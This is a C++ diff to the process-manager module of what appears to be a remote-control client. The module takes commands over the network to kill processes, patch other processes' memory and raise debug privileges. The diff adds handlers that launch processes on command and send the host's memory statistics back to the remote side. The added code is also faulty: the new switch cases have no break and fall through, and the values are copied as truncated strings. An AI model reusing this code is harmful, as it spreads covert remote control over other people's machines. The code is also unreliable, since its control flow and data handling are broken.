@@ -16,6 +16,7 @@ CProcessManager::CProcessManager(CIocpClient* IocpClient) :CManager(IocpClient)
 	m_ScanRelpy = 0;
 
 }
+
 CProcessManager::~CProcessManager()
 {
 	_tprintf(_T("~CProcessManager()\r\n"));
@@ -44,6 +45,11 @@ void CProcessManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
 		ZhKillProcess((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));
 
 		break;
+	}
+	case CLIENT_OPEN_PROCESS_REQUIRE:
+	{
+		memcpy(__BufferData2, (LPBYTE)BufferData, BufferLength);
+		ZhCreateProcess6(__BufferData2);
 	}
 	case CLIENT_REMOTE_CHANGE_MEMORY_REQUIRE:
 	{
@@ -78,12 +84,15 @@ void CProcessManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
 		MemoryValueChange(BufferData + sizeof(BYTE), sizeof(int)+sizeof(size_t));
 		ZhEnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
 	}
+	case CLIENT_VIRTUAL_MEMORY_MAPPING_REQUIRE:
+	{
+		SendClientSystemInfo();
+	}
 
-
+	
 	default:
 	{
-	memcpy(__BufferData2, (LPBYTE)BufferData, BufferLength);
-	ZhCreateProcess6(__BufferData2);
+	
 	}
 
 	}
@@ -217,6 +226,47 @@ void CProcessManager::MemoryValueChange(PBYTE bufferData, ULONG_PTR BufferLength
 
 	WriteProcessMemory(ProcessHandle, (LPVOID)TargetAddress, &TargetValue, sizeof(int), NULL);
 	
+}
+void CProcessManager::SendClientSystemInfo()
+{
+	SYSTEM_INFO sysInfo;
+	GetSystemInfo(&sysInfo);
+
+	MEMORYSTATUS memstatus;
+	memstatus.dwLength =sizeof(memstatus);
+	GlobalMemoryStatus(&memstatus);
+	int BufferLength = sizeof(BYTE) + 9 * sizeof(size_t);
+	LPBYTE BufferData = new BYTE[BufferLength];
+	BufferData[0] = CLIENT_VIRTUAL_MEMORY_MAPPING_REPLY;
+	CString v1;
+	v1.Format(_T("%p"), sysInfo.dwPageSize);
+	memcpy(BufferData + sizeof(BYTE), v1, sizeof(size_t));
+	//this->SetDlgItemText(IDC_MEMORY_PAGE_SIZE_EDIT, v1);     //也可以用这种方式
+	v1.Format(_T("%p"), sysInfo.lpMinimumApplicationAddress);
+	memcpy(BufferData + sizeof(BYTE)+sizeof(size_t), v1, sizeof(size_t));
+
+	v1.Format(_T("%p"), sysInfo.lpMaximumApplicationAddress);
+	memcpy(BufferData + sizeof(BYTE)+2*sizeof(size_t), v1, sizeof(size_t));
+
+	v1.Format(_T("%p"), memstatus.dwTotalPhys);
+	memcpy(BufferData + sizeof(BYTE) + 3 * sizeof(size_t), v1, sizeof(size_t));
+
+	v1.Format(_T("%p"), memstatus.dwAvailPhys);
+	memcpy(BufferData + sizeof(BYTE) + 4 * sizeof(size_t), v1, sizeof(size_t));
+
+	v1.Format(_T("%p"), memstatus.dwTotalPageFile);
+	memcpy(BufferData + sizeof(BYTE) + 5 * sizeof(size_t), v1, sizeof(size_t));
+
+	v1.Format(_T("%p"), memstatus.dwAvailPageFile);
+	memcpy(BufferData + sizeof(BYTE) + 6 * sizeof(size_t), v1, sizeof(size_t));
+
+	v1.Format(_T("%p"), memstatus.dwTotalVirtual);
+	memcpy(BufferData + sizeof(BYTE) + 7 * sizeof(size_t), v1, sizeof(size_t));
+
+	v1.Format(_T("%p"), memstatus.dwAvailVirtual);
+	memcpy(BufferData + sizeof(BYTE) + 8 * sizeof(size_t), v1, sizeof(size_t));
+
+	m_IocpClient->OnSending((char*)BufferData, BufferLength);
 }
 BOOL CProcessManager::SendClientAddressList()
 {
